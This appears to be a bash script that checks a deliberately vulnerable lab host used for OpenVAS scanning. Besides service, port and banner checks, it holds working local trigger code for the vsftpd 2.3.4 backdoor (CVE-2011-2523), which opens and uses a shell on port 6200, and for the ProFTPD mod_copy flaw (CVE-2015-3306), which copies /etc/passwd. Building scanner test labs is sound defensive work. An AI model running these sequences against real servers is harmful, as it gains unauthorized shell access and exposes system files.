#!/bin/bash
# Quick host verification for OpenVAS-facing services
set -euo pipefail

echo "==== systemd ===="
systemctl is-active vsftpd-234-lab.service || true
systemctl is-active proftpd-lab.service || true
systemctl is-active apache2 || true

echo "==== ports ===="
ss -lntp | grep -E ':21 |:2121|:80 |:6200' || true

echo "==== banners ===="
timeout 2 bash -c 'exec 3<>/dev/tcp/127.0.0.1/21; head -1 <&3' || echo 'FAIL :21'
timeout 2 bash -c 'exec 3<>/dev/tcp/127.0.0.1/2121; head -1 <&3' || echo 'FAIL :2121'

echo "==== CVE-2011-2523 trigger (local) ===="
python3 - <<'PY'
import socket, time
s = socket.create_connection(("127.0.0.1", 21), timeout=3)
print(s.recv(256).decode(errors="replace").strip())
s.sendall(b"USER verify:)\r\n")
try:
    print(s.recv(256).decode(errors="replace").strip())
except Exception as e:
    print(e)
time.sleep(1.2)
s.close()
b = socket.create_connection(("127.0.0.1", 6200), timeout=3)
b.sendall(b"id\n")
print("6200:", b.recv(256).decode(errors="replace").strip())
b.close()
PY

echo "==== CVE-2015-3306 NVT sequence (local) ===="
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 2121), timeout=3)
print(s.recv(256).decode(errors="replace").strip())
for cmd in (b"SITE CPFR /etc/passwd\r\n", b"SITE CPTO /tmp/passwd.copy\r\n"):
    s.sendall(cmd)
    print(s.recv(256).decode(errors="replace").strip())
s.close()
PY

echo "==== Apache ===="
grep DocumentRoot /etc/apache2/sites-enabled/proftpd-lab.conf || true
curl -sI http://127.0.0.1/ | head -5
echo "OK"
